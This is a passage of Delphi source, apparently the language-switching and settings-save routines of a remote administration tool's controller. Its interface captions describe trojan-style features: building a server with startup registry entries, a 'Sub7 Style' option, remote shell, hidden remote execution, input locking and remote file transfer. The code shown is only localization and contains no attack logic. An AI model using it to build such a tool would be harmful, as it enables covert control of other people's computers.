form1.flatbutton4.caption:='Processes';
form1.flatbutton5.caption:='Applications';
form1.flatbutton36.caption:='Wav';
form1.flatbutton17.caption:='Screenshot';
form1.flatbutton42.caption:='AW';
form1.flatbutton3.caption:='Windows';
form1.flatbutton6.caption:='Active Window';
form1.flatbutton16.caption:='Identify Program';
form1.flatbutton1.caption:='Stable info';
form1.flatbutton15.caption:='Active Data';
form1.flatbutton12.caption:='Visual Contact';
form1.flatbutton19.caption:='Messagebox';
form1.flatbutton13.caption:='Blocking';
form1.flatbutton45.caption:='Window Tracker';
form1.flatbutton41.caption:='Open CDROM tray';
form1.flatbutton57.caption:='Close';
form1.flatbutton44.caption:='Activate Idle Warning';
form1.flatbutton49.caption:='Download File From Web';
form1.flatbutton46.caption:='Uninstall From System';
form1.flatedit17.Text:='Caption';
form1.flatedit12.Text:='Message';
form1.flatradiobutton3.Caption:='OK';
form1.flatradiobutton5.Caption:='Yes-NO';
form1.flatradiobutton4.Caption:='OK-Cancel';
form1.flatradiobutton6.Caption:='Retry-Cancel';
form1.flatbutton31.caption:='Send';
form1.flatbutton34.caption:='Test';
form1.flatbutton21.caption:='Lock Input Devices';
form1.flatbutton20.caption:='Undo';
form1.flatbutton26.caption:='Undo';
form1.flatbutton23.caption:='Undo';
form1.flatbutton40.caption:='Undo';
form1.flatbutton24.caption:='Freeze Mouse';
form1.flatbutton22.caption:='Lock Active Window';
form1.flatbutton37.caption:='Block Process';
form1.flatedit11.Text:='Message';
form1.flatedit19.Text:='Size';
form1.Label11.Caption:='Coordinates :';
form1.flatcheckbox8.Caption:='Calculate Center of screen';
form1.Label9.Caption:='Colors :';
form1.flatcheckbox16.Caption:='Stay on Screen';
form1.flatbutton55.caption:='Clear?';
form1.flatbutton11.caption:='Send';
form1.flatbutton10.caption:='Test';
form1.flatbutton9.caption:='Exit';
form1.flatbutton38.caption:='About Program';
form1.flatbutton29.caption:='Settings';
form1.flatbutton8.caption:='Start !';
form1.basinti:='Start !';
form1.FlatCheckBox12.Caption:='Stretch Image To Area';
form1.label7.Caption:='External Ports';
form1.label13.Caption:='Datakesh Settings';
form1.label4.Caption:='Host          :';
form1.label6.Caption:='Password  :';
form1.label20.Caption:='Filename   :';
form1.label19.Caption:='Reg. Name :';
form1.label17.Caption:='Startup      :';
form1.flatcheckbox15.Caption:='Sub7 Style';
form1.FlatButton59.Caption:='Build !';
form1.FlatButton58.Caption:='Read Settings';
form1.FlatButton60.Caption:='Generate';
form1.label10.Caption:='Max. Packet Size      :';
form1.label15.Caption:='Max. Compression    :';
form1.label16.Caption:='P.Send TimeOut        :';
form1.label22.Caption:='Connection interval  :';
form1.FlatButton61.Caption:='Clear';
form1.FlatButton52.Caption:='Add';
form1.FlatCheckBox18.Caption:='Use External FTP Server';
//form1.FlatEdit3.Text:='Host';
//form1.FlatEdit4.Text:='User';
//form1.FlatEdit5.Text:='Pass';
form1.FlatButton56.Caption:='Defaults';
form1.FlatCheckBox1.Caption:='Auto Add Slash';
form1.FlatCheckBox5.Caption:='Manual Command Mode';
form1.FlatCheckBox14.Caption:='Remote Shell Mode';
form1.FlatCheckBox7.Caption:='Visual warnings';
form1.FlatCheckBox11.Caption:='Enable Sounds';
form1.FlatCheckBox13.Caption:='Console Log';
form1.FlatCheckBox21.Caption:='Minimize to tray';
form1.FlatCheckBox10.Caption:='Save Temporary Files';
form1.FlatCheckBox2.Caption:='Ask Before Action when GUI Mode';
form1.FlatCheckBox4.Caption:='Fix %100 Cpu Usage';
form1.ListView1.Columns[0].Caption:='Socket';
form1.ListView1.Columns[2].Caption:='Local Port';
form1.ListView1.Columns[3].Caption:='User';
form1.ListView3.Columns[0].Caption:='Socket';
form1.ListView3.Columns[1].Caption:='From';
form1.ListView3.Columns[2].Caption:='File';
form1.ListView3.Columns[3].Caption:='Transferred';
form1.ListView3.Columns[4].Caption:='User';
form1.MSNPopUp1.Title:='New Connection';
form1.PopupMenu1.Items[0].Caption:='Activate';
form1.PopupMenu1.Items[1].Caption:='Kill Socket';
form1.PopupMenu1.Items[3].Caption:='Refresh';
form1.PopupMenu1.Items[5].Caption:='Disconnect';
form1.PopupMenu1.Items[6].Caption:='Terminate Program';
form1.PopupMenu1.Items[7].Caption:='Uninstall From System';
form1.PopupMenu1.Items[9].Caption:='Apply To All';
form1.PopupMenu1.Items[9].Items[0].Caption:='Disconnect';
form1.PopupMenu1.Items[9].Items[1].Caption:='Terminate';
form1.PopupMenu1.Items[9].Items[2].Caption:='Uninstall';
form1.PopupMenu1.Items[9].Items[3].Caption:='Idle Warning';
form1.PopupMenu1.Items[11].Caption:='Activate Idle Warning';
form1.PopupMenu4.Items[0].Caption:='Terminate Process';
form1.PopupMenu4.Items[2].Caption:='Refresh';
form1.PopupMenu4.Items[4].Caption:='New Process';
form1.PopupMenu2.Items[0].Caption:='Open';
form1.PopupMenu2.Items[1].Caption:='View Folder';
form1.PopupMenu2.Items[3].Caption:='Cancel Transfer';
form1.PopupMenu2.Items[4].Caption:='Cancel all';
form1.PopupMenu2.Items[5].Caption:='Stop Mass Download';
form1.PopupMenu2.Items[7].Caption:='Clear';
form1.PopupMenu5.Items[0].Caption:='Close Window';
form1.PopupMenu5.Items[1].Caption:='Take Shot';
form1.PopupMenu5.Items[2].Caption:='Change Caption';
form1.PopupMenu5.Items[4].Caption:='Window Control';
form1.PopupMenu5.Items[4].items[0].Caption:='Maximize';
form1.PopupMenu5.Items[4].items[1].Caption:='Activate';
form1.PopupMenu5.Items[4].items[3].Caption:='Show';
form1.PopupMenu5.Items[4].items[4].Caption:='Hide';
form1.PopupMenu5.Items[4].items[5].Caption:='Lock';
form1.PopupMenu5.Items[4].items[6].Caption:='Unlock';
form1.PopupMenu5.Items[6].Caption:='Refresh';
form1.PopupMenu5.Items[8].Caption:='List All Windows';
form1.PopupMenu3.Items[0].Caption:='Main Window';
form1.PopupMenu3.Items[1].Caption:='File Manager';
form1.PopupMenu3.Items[3].Caption:='Exit';
form1.duruntu:='STOP';
form2.flatbutton52.Caption:='List';
form2.flatbutton8.Caption:='Drives                ';
form2.flatbutton1.Caption:='System Folders';
form2.flatbutton2.Caption:='Special Folders';
form2.flatcheckbox5.Caption:='Auto Retrieve File info';
form2.flatcheckbox3.Caption:='Sort By File Type';
form2.PopupMenu1.Items[0].Caption:='Download';
form2.PopupMenu1.Items[1].Caption:='Execute on Remote Side';
form2.PopupMenu1.Items[1].items[0].items[1].Caption:='Hidden';
form2.PopupMenu1.Items[3].Caption:='Generate Picture Thumbnails';
form2.PopupMenu1.Items[4].Caption:='Upload File Here';
form2.PopupMenu1.Items[5].Caption:='Download all';
form2.PopupMenu1.Items[7].Caption:='Refresh';
form2.PopupMenu1.Items[9].Caption:='Copy';
form2.PopupMenu1.Items[10].Caption:='Delete';
form2.PopupMenu1.Items[11].Caption:='Rename';
form2.PopupMenu1.Items[13].Caption:='Delete All';
form2.PopupMenu1.Items[15].Caption:='File info';
form2.PopupMenu2.Items[0].Caption:='Open';
form2.PopupMenu2.Items[1].Caption:='Set Label';
form2.PopupMenu2.Items[3].Caption:='Refresh';
form2.PopupMenu2.Items[5].Caption:='Drive info';
form1.FlatButton2.Caption:='Send';
form1.FlatCheckBox3.Caption:='Support old versions';
end;

procedure turkce;
begin
form1.flatbutton39.caption:=eskidil[0];
form1.balanti:=eskidil[1];
form1.kasinti:=eskidil[2];
form1.flatbutton33.caption:=eskidil[3];
form1.flatbutton4.caption:=eskidil[4];
form1.flatbutton5.caption:=eskidil[5];
form1.flatbutton36.caption:=eskidil[6];
form1.flatbutton17.caption:=eskidil[7];
form1.flatbutton42.caption:=eskidil[8];
form1.flatbutton3.caption:=eskidil[9];
form1.flatbutton6.caption:=eskidil[10];
form1.flatbutton16.caption:=eskidil[11];
form1.flatbutton1.caption:=eskidil[12];
form1.flatbutton15.caption:=eskidil[13];
form1.flatbutton12.caption:=eskidil[14];
form1.flatbutton19.caption:=eskidil[15];
form1.flatbutton13.caption:=eskidil[16];
form1.flatbutton45.caption:=eskidil[17];
form1.flatbutton41.caption:=eskidil[18];
form1.flatbutton57.caption:=eskidil[19];
form1.flatbutton44.caption:=eskidil[20];
form1.flatbutton49.caption:=eskidil[21];
form1.flatbutton46.caption:=eskidil[22];
form1.flatedit17.Text:=eskidil[23];
form1.flatedit12.Text:=eskidil[24];
form1.flatradiobutton3.Caption:=eskidil[25];
form1.flatradiobutton5.Caption:=eskidil[26];
form1.flatradiobutton4.Caption:=eskidil[27];
form1.flatradiobutton6.Caption:=eskidil[28];
form1.flatbutton31.caption:=eskidil[29];
form1.flatbutton34.caption:=eskidil[30];
form1.flatbutton21.caption:=eskidil[31];
form1.flatbutton20.caption:=eskidil[32];
form1.flatbutton26.caption:=eskidil[33];
form1.flatbutton23.caption:=eskidil[34];
form1.flatbutton40.caption:=eskidil[35];
form1.flatbutton24.caption:=eskidil[36];
form1.flatbutton22.caption:=eskidil[37];
form1.flatbutton37.caption:=eskidil[38];
form1.flatedit11.Text:=eskidil[39];
form1.flatedit19.Text:=eskidil[40];
form1.Label11.Caption:=eskidil[41];
form1.flatcheckbox8.Caption:=eskidil[42];
form1.Label9.Caption:=eskidil[43];
form1.flatcheckbox16.Caption:=eskidil[44];
form1.flatbutton55.caption:=eskidil[45];
form1.flatbutton11.caption:=eskidil[46];
form1.flatbutton10.caption:=eskidil[47];
form1.flatbutton9.caption:=eskidil[48];
form1.flatbutton38.caption:=eskidil[49];
form1.flatbutton29.caption:=eskidil[50];
form1.flatbutton8.caption:=eskidil[51];
form1.FlatCheckBox12.Caption:=eskidil[52];
form1.label7.Caption:=eskidil[53];
form1.label13.Caption:=eskidil[54];
form1.label4.Caption:=eskidil[55];
form1.label6.Caption:=eskidil[56];
form1.label20.Caption:=eskidil[57];
form1.label19.Caption:=eskidil[58];
form1.label17.Caption:=eskidil[59];
form1.flatcheckbox15.Caption:=eskidil[60];
form1.FlatButton59.Caption:=eskidil[61];
form1.FlatButton58.Caption:=eskidil[62];
form1.FlatButton60.Caption:=eskidil[63];
form1.label10.Caption:=eskidil[64];
form1.label15.Caption:=eskidil[65];
form1.label16.Caption:=eskidil[66];
form1.label22.Caption:=eskidil[67];
form1.FlatButton61.Caption:=eskidil[68];
form1.FlatButton52.Caption:=eskidil[69];
form1.FlatCheckBox18.Caption:=eskidil[70];
form1.FlatEdit3.Text:=eskidil[71];
form1.FlatEdit4.Text:=eskidil[72];
form1.FlatEdit5.Text:=eskidil[73];
form1.FlatButton56.Caption:=eskidil[74];
form1.FlatCheckBox1.Caption:=eskidil[75];
form1.FlatCheckBox5.Caption:=eskidil[76];
form1.FlatCheckBox14.Caption:=eskidil[77];
form1.FlatCheckBox7.Caption:=eskidil[78];
form1.FlatCheckBox11.Caption:=eskidil[79];
form1.FlatCheckBox13.Caption:=eskidil[80];
form1.FlatCheckBox21.Caption:=eskidil[81];
form1.FlatCheckBox10.Caption:=eskidil[82];
form1.FlatCheckBox2.Caption:=eskidil[83];
form1.FlatCheckBox4.Caption:=eskidil[84];
form1.ListView1.Columns[0].Caption:=eskidil[85];
form1.ListView1.Columns[2].Caption:=eskidil[86];
form1.ListView1.Columns[3].Caption:=eskidil[87];
form1.ListView3.Columns[0].Caption:=eskidil[88];
form1.ListView3.Columns[1].Caption:=eskidil[89];
form1.ListView3.Columns[2].Caption:=eskidil[90];
form1.ListView3.Columns[3].Caption:=eskidil[91];
form1.ListView3.Columns[4].Caption:=eskidil[92];
form1.MSNPopUp1.Title:=eskidil[93];
form1.PopupMenu1.Items[0].Caption:=eskidil[94];
form1.PopupMenu1.Items[1].Caption:=eskidil[95];
form1.PopupMenu1.Items[3].Caption:=eskidil[96];
form1.PopupMenu1.Items[5].Caption:=eskidil[97];
form1.PopupMenu1.Items[6].Caption:=eskidil[98];
form1.PopupMenu1.Items[7].Caption:=eskidil[99];
form1.PopupMenu1.Items[9].Caption:=eskidil[100];
form1.PopupMenu1.Items[9].Items[0].Caption:=eskidil[101];
form1.PopupMenu1.Items[9].Items[1].Caption:=eskidil[102];
form1.PopupMenu1.Items[9].Items[2].Caption:=eskidil[103];
form1.PopupMenu1.Items[9].Items[3].Caption:=eskidil[104];
form1.PopupMenu1.Items[11].Caption:=eskidil[105];
form1.PopupMenu4.Items[0].Caption:=eskidil[106];
form1.PopupMenu4.Items[2].Caption:=eskidil[107];
form1.PopupMenu4.Items[4].Caption:=eskidil[108];
form1.PopupMenu2.Items[0].Caption:=eskidil[109];
form1.PopupMenu2.Items[1].Caption:=eskidil[110];
form1.PopupMenu2.Items[3].Caption:=eskidil[111];
form1.PopupMenu2.Items[4].Caption:=eskidil[112];
form1.PopupMenu2.Items[5].Caption:=eskidil[113];
form1.PopupMenu2.Items[7].Caption:=eskidil[114];
form1.PopupMenu5.Items[0].Caption:=eskidil[115];
form1.PopupMenu5.Items[1].Caption:=eskidil[116];
form1.PopupMenu5.Items[2].Caption:=eskidil[117];
form1.PopupMenu5.Items[4].Caption:=eskidil[118];
form1.PopupMenu5.Items[4].items[0].Caption:=eskidil[119];
form1.PopupMenu5.Items[4].items[1].Caption:=eskidil[120];
form1.PopupMenu5.Items[4].items[3].Caption:=eskidil[121];
form1.PopupMenu5.Items[4].items[4].Caption:=eskidil[122];
form1.PopupMenu5.Items[4].items[5].Caption:=eskidil[123];
form1.PopupMenu5.Items[4].items[6].Caption:=eskidil[124];
form1.PopupMenu5.Items[6].Caption:=eskidil[125];
form1.PopupMenu5.Items[8].Caption:=eskidil[126];
form1.PopupMenu3.Items[0].Caption:=eskidil[127];
form1.PopupMenu3.Items[1].Caption:=eskidil[128];
form1.PopupMenu3.Items[3].Caption:=eskidil[129];
form1.duruntu:=eskidil[130];
form2.flatbutton52.Caption:=eskidil[131];
form2.flatbutton8.Caption:=eskidil[132];
form2.flatbutton1.Caption:=eskidil[133];
form2.flatbutton2.Caption:=eskidil[134];
form2.flatcheckbox5.Caption:=eskidil[135];
form2.flatcheckbox3.Caption:=eskidil[136];
form2.PopupMenu1.Items[0].Caption:=eskidil[137];
form2.PopupMenu1.Items[1].Caption:=eskidil[138];
form2.PopupMenu1.Items[1].items[0].items[1].Caption:=eskidil[139];
form2.PopupMenu1.Items[3].Caption:=eskidil[140];
form2.PopupMenu1.Items[4].Caption:=eskidil[141];
form2.PopupMenu1.Items[5].Caption:=eskidil[142];
form2.PopupMenu1.Items[7].Caption:=eskidil[143];
form2.PopupMenu1.Items[9].Caption:=eskidil[144];
form2.PopupMenu1.Items[10].Caption:=eskidil[145];
form2.PopupMenu1.Items[11].Caption:=eskidil[146];
form2.PopupMenu1.Items[13].Caption:=eskidil[147];
form2.PopupMenu1.Items[15].Caption:=eskidil[148];
form2.PopupMenu2.Items[0].Caption:=eskidil[149];
form2.PopupMenu2.Items[1].Caption:=eskidil[150];
form2.PopupMenu2.Items[3].Caption:=eskidil[151];
form2.PopupMenu2.Items[5].Caption:=eskidil[152];
form1.duruntu:=eskidil[153];
form1.basinti:='Ba$la !';
form1.FlatButton2.Caption:='Gönder';
//form1.FlatEdit3.Text:='Sunucu';
//form1.FlatEdit4.Text:='Kullanici';
//form1.FlatEdit5.Text:='Parola';
form1.FlatCheckBox3.Caption:=eskidil[154];
end;

procedure diloku;
begin
eskidil[0]:=form1.flatbutton39.caption;
eskidil[1]:=form1.balanti;
eskidil[2]:=form1.kasinti;
eskidil[3]:=form1.flatbutton33.caption;
eskidil[4]:=form1.flatbutton4.caption;
eskidil[5]:=form1.flatbutton5.caption;
eskidil[6]:=form1.flatbutton36.caption;
eskidil[7]:=form1.flatbutton17.caption;
eskidil[8]:=form1.flatbutton42.caption;
eskidil[9]:=form1.flatbutton3.caption;
eskidil[10]:=form1.flatbutton6.caption;
eskidil[11]:=form1.flatbutton16.caption;
eskidil[12]:=form1.flatbutton1.caption;
eskidil[13]:=form1.flatbutton15.caption;
eskidil[14]:=form1.flatbutton12.caption;
eskidil[15]:=form1.flatbutton19.caption;
eskidil[16]:=form1.flatbutton13.caption;
eskidil[17]:=form1.flatbutton45.caption;
eskidil[18]:=form1.flatbutton41.caption;
eskidil[19]:=form1.flatbutton57.caption;
eskidil[20]:=form1.flatbutton44.caption;
eskidil[21]:=form1.flatbutton49.caption;
eskidil[22]:=form1.flatbutton46.caption;
eskidil[23]:=form1.flatedit17.Text;
eskidil[24]:=form1.flatedit12.Text;
eskidil[25]:=form1.flatradiobutton3.Caption;
eskidil[26]:=form1.flatradiobutton5.Caption;
eskidil[27]:=form1.flatradiobutton4.Caption;
eskidil[28]:=form1.flatradiobutton6.Caption;
eskidil[29]:=form1.flatbutton31.caption;
eskidil[30]:=form1.flatbutton34.caption;
eskidil[31]:=form1.flatbutton21.caption;
eskidil[32]:=form1.flatbutton20.caption;
eskidil[33]:=form1.flatbutton26.caption;
eskidil[34]:=form1.flatbutton23.caption;
eskidil[35]:=form1.flatbutton40.caption;
eskidil[36]:=form1.flatbutton24.caption;
eskidil[37]:=form1.flatbutton22.caption;
eskidil[38]:=form1.flatbutton37.caption;
eskidil[39]:=form1.flatedit11.Text;
eskidil[40]:=form1.flatedit19.Text;
eskidil[41]:=form1.Label11.Caption;
eskidil[42]:=form1.flatcheckbox8.Caption;
eskidil[43]:=form1.Label9.Caption;
eskidil[44]:=form1.flatcheckbox16.Caption;
eskidil[45]:=form1.flatbutton55.caption;
eskidil[46]:=form1.flatbutton11.caption;
eskidil[47]:=form1.flatbutton10.caption;
eskidil[48]:=form1.flatbutton9.caption;
eskidil[49]:=form1.flatbutton38.caption;
eskidil[50]:=form1.flatbutton29.caption;
eskidil[51]:=form1.flatbutton8.caption;
eskidil[52]:=form1.FlatCheckBox12.Caption;
eskidil[53]:=form1.label7.Caption;
eskidil[54]:=form1.label13.Caption;
eskidil[55]:=form1.label4.Caption;
eskidil[56]:=form1.label6.Caption;
eskidil[57]:=form1.label20.Caption;
eskidil[58]:=form1.label19.Caption;
eskidil[59]:=form1.label17.Caption;
eskidil[60]:=form1.flatcheckbox15.Caption;
eskidil[61]:=form1.FlatButton59.Caption;
eskidil[62]:=form1.FlatButton58.Caption;
eskidil[63]:=form1.FlatButton60.Caption;
eskidil[64]:=form1.label10.Caption;
eskidil[65]:=form1.label15.Caption;
eskidil[66]:=form1.label16.Caption;
eskidil[67]:=form1.label22.Caption;
eskidil[68]:=form1.FlatButton61.Caption;
eskidil[69]:=form1.FlatButton52.Caption;
eskidil[70]:=form1.FlatCheckBox18.Caption;
eskidil[71]:=form1.FlatEdit3.Text;
eskidil[72]:=form1.FlatEdit4.Text;
eskidil[73]:=form1.FlatEdit5.Text;
eskidil[74]:=form1.FlatButton56.Caption;
eskidil[75]:=form1.FlatCheckBox1.Caption;
eskidil[76]:=form1.FlatCheckBox5.Caption;
eskidil[77]:=form1.FlatCheckBox14.Caption;
eskidil[78]:=form1.FlatCheckBox7.Caption;
eskidil[79]:=form1.FlatCheckBox11.Caption;
eskidil[80]:=form1.FlatCheckBox13.Caption;
eskidil[81]:=form1.FlatCheckBox21.Caption;
eskidil[82]:=form1.FlatCheckBox10.Caption;
eskidil[83]:=form1.FlatCheckBox2.Caption;
eskidil[84]:=form1.FlatCheckBox4.Caption;
eskidil[85]:=form1.ListView1.Columns[0].Caption;
eskidil[86]:=form1.ListView1.Columns[2].Caption;
eskidil[87]:=form1.ListView1.Columns[3].Caption;
eskidil[88]:=form1.ListView3.Columns[0].Caption;
eskidil[89]:=form1.ListView3.Columns[1].Caption;
eskidil[90]:=form1.ListView3.Columns[2].Caption;
eskidil[91]:=form1.ListView3.Columns[3].Caption;
eskidil[92]:=form1.ListView3.Columns[4].Caption;
eskidil[93]:=form1.MSNPopUp1.Title;
eskidil[94]:=form1.PopupMenu1.Items[0].Caption;
eskidil[95]:=form1.PopupMenu1.Items[1].Caption;
eskidil[96]:=form1.PopupMenu1.Items[3].Caption;
eskidil[97]:=form1.PopupMenu1.Items[5].Caption;
eskidil[98]:=form1.PopupMenu1.Items[6].Caption;
eskidil[99]:=form1.PopupMenu1.Items[7].Caption;
eskidil[100]:=form1.PopupMenu1.Items[9].Caption;
eskidil[101]:=form1.PopupMenu1.Items[9].Items[0].Caption;
eskidil[102]:=form1.PopupMenu1.Items[9].Items[1].Caption;
eskidil[103]:=form1.PopupMenu1.Items[9].Items[2].Caption;
eskidil[104]:=form1.PopupMenu1.Items[9].Items[3].Caption;
eskidil[105]:=form1.PopupMenu1.Items[11].Caption;
eskidil[106]:=form1.PopupMenu4.Items[0].Caption;
eskidil[107]:=form1.PopupMenu4.Items[2].Caption;
eskidil[108]:=form1.PopupMenu4.Items[4].Caption;
eskidil[109]:=form1.PopupMenu2.Items[0].Caption;
eskidil[110]:=form1.PopupMenu2.Items[1].Caption;
eskidil[111]:=form1.PopupMenu2.Items[3].Caption;
eskidil[112]:=form1.PopupMenu2.Items[4].Caption;
eskidil[113]:=form1.PopupMenu2.Items[5].Caption;
eskidil[114]:=form1.PopupMenu2.Items[7].Caption;
eskidil[115]:=form1.PopupMenu5.Items[0].Caption;
eskidil[116]:=form1.PopupMenu5.Items[1].Caption;
eskidil[117]:=form1.PopupMenu5.Items[2].Caption;
eskidil[118]:=form1.PopupMenu5.Items[4].Caption;
eskidil[119]:=form1.PopupMenu5.Items[4].items[0].Caption;
eskidil[120]:=form1.PopupMenu5.Items[4].items[1].Caption;
eskidil[121]:=form1.PopupMenu5.Items[4].items[3].Caption;
eskidil[122]:=form1.PopupMenu5.Items[4].items[4].Caption;
eskidil[123]:=form1.PopupMenu5.Items[4].items[5].Caption;
eskidil[124]:=form1.PopupMenu5.Items[4].items[6].Caption;
eskidil[125]:=form1.PopupMenu5.Items[6].Caption;
eskidil[126]:=form1.PopupMenu5.Items[8].Caption;
eskidil[127]:=form1.PopupMenu3.Items[0].Caption;
eskidil[128]:=form1.PopupMenu3.Items[1].Caption;
eskidil[129]:=form1.PopupMenu3.Items[3].Caption;
eskidil[130]:=form1.duruntu;
eskidil[131]:=form2.flatbutton52.Caption;
eskidil[132]:=form2.flatbutton8.Caption;
eskidil[133]:=form2.flatbutton1.Caption;
eskidil[134]:=form2.flatbutton2.Caption;
eskidil[135]:=form2.flatcheckbox5.Caption;
eskidil[136]:=form2.flatcheckbox3.Caption;
eskidil[137]:=form2.PopupMenu1.Items[0].Caption;
eskidil[138]:=form2.PopupMenu1.Items[1].Caption;
eskidil[139]:=form2.PopupMenu1.Items[1].items[0].items[1].Caption;
eskidil[140]:=form2.PopupMenu1.Items[3].Caption;
eskidil[141]:=form2.PopupMenu1.Items[4].Caption;
eskidil[142]:=form2.PopupMenu1.Items[5].Caption;
eskidil[143]:=form2.PopupMenu1.Items[7].Caption;
eskidil[144]:=form2.PopupMenu1.Items[9].Caption;
eskidil[145]:=form2.PopupMenu1.Items[10].Caption;
eskidil[146]:=form2.PopupMenu1.Items[11].Caption;
eskidil[147]:=form2.PopupMenu1.Items[13].Caption;
eskidil[148]:=form2.PopupMenu1.Items[15].Caption;
eskidil[149]:=form2.PopupMenu2.Items[0].Caption;
eskidil[150]:=form2.PopupMenu2.Items[1].Caption;
eskidil[151]:=form2.PopupMenu2.Items[3].Caption;
eskidil[152]:=form2.PopupMenu2.Items[5].Caption;
eskidil[153]:=form1.duruntu;
eskidil[154]:=form1.FlatCheckBox3.Caption;
end;

procedure temizle;
begin
deletefile(extractfilepath(paramstr(0))+'ayar.dat_');
deletefile(extractfilepath(paramstr(0))+'ayar.dat');
end;

procedure kaydet(yazilasi,nereye:string);
var
dosya:string;
F:Textfile;
begin
deletefile(extractfilepath(paramstr(0))+nereye);
dosya:=extractfilepath(paramstr(0))+nereye+'_';
try
Assignfile(F,dosya);
Rewrite(F);
Append(F);
If IOResult<> 0 Then begin
Closefile(F);
exit;
end;
Write(F,yazilasi);
Closefile(F);
sikistir(extractfilepath(paramstr(0))+nereye+'_',extractfilepath(paramstr(0))+nereye);
deletefile(extractfilepath(paramstr(0))+nereye+'_');
except on exception do temizle
end;
end;

end.
 